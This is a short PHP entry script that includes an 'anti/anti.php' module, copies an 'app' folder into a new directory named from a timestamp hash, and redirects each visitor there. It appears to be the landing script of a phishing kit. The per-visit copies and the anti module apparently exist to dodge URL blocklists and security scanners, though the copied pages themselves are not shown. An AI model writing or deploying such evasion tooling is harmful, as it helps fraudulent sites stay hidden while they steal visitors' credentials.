<?php
	error_reporting(E_ERROR | E_PARSE);
	include('anti/anti.php');
	$date = new DateTime("NOW");
	$FOL = md5($date->format( "m-d-Y H:i:s.u"));

	//PATH OF THE FOLDER
	$YSS="app";
	xysrecurse_copyx($YSS, $FOL);
	header("location: $FOL");
	
	function xysrecurse_copyx($YSS,$FOL) {
		$dir = opendir($YSS);
		@mkdir($FOL);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($YSS . '/' . $file) ) {
				xysrecurse_copyx($YSS . '/' . $file,$FOL . '/' . $file);
				}
				else {
				copy($YSS . '/' . $file,$FOL . '/' . $file);
				}
			}
		}
		closedir($dir);
	}
?>